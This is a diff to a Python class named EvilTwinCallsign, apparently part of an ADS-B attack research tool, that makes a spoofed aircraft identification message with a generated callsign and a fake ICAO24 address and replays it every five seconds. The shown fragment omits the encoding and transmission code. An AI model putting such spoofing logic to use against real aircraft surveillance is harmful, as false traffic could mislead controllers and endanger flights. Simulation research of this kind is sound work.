@@ -70,6 +70,7 @@ class EvilTwinCallsign(AbstractAttack):
         # timeout de espera de mensagens ADS-B da vítima selecionada em segundos
         self.__time_out = 20
 
+        self.__s_callsign = None
         #
         self.__s_last_position_msg = "ODD"
 
@@ -137,16 +138,12 @@ class EvilTwinCallsign(AbstractAttack):
         time.sleep(random.randint(0,5))
 
         while True:
-            if ldefs.CALLSIGN in self.__dct_aircraft:
-                ls_callsing = self.__dct_aircraft[ldefs.CALLSIGN]
-                ls_callsing = "PPXPTO"
+            # Hex
+            ls_msg = self.encode_aircraft_identification(self.__s_callsign, self.__s_fake_icao24)
+            self.replay(ls_msg)
 
-                # Hex
-                ls_msg = self.encode_aircraft_identification(ls_callsing, self.__s_fake_icao24)
-                self.replay(ls_msg)
-
-                # mensagens de 5 em 5 segundos
-                time.sleep(5.0)
+            # mensagens de 5 em 5 segundos
+            time.sleep(5.0)
 
 
     # ---------------------------------------------------------------------------------------------
@@ -210,15 +207,6 @@ class EvilTwinCallsign(AbstractAttack):
 
 
     # ---------------------------------------------------------------------------------------------
-    def calculate_kinematics(self):
-        """
-
-        :return:
-        """
-        raise NotImplementedError()
-
-
-    # ---------------------------------------------------------------------------------------------
     def start(self, fi_time_to_attack, fi_interval_to_attack):
         """
 
@@ -226,6 +214,8 @@ class EvilTwinCallsign(AbstractAttack):
         :return:
         """
         super(EvilTwinCallsign, self).start(fi_time_to_attack, fi_interval_to_attack)
+
+        self.__s_callsign = self.get_new_callsign()
 
         # iniciar as threads aqui!!!!
         t1 = threading.Thread(target=self.__airborne_pos_threaded, args=())
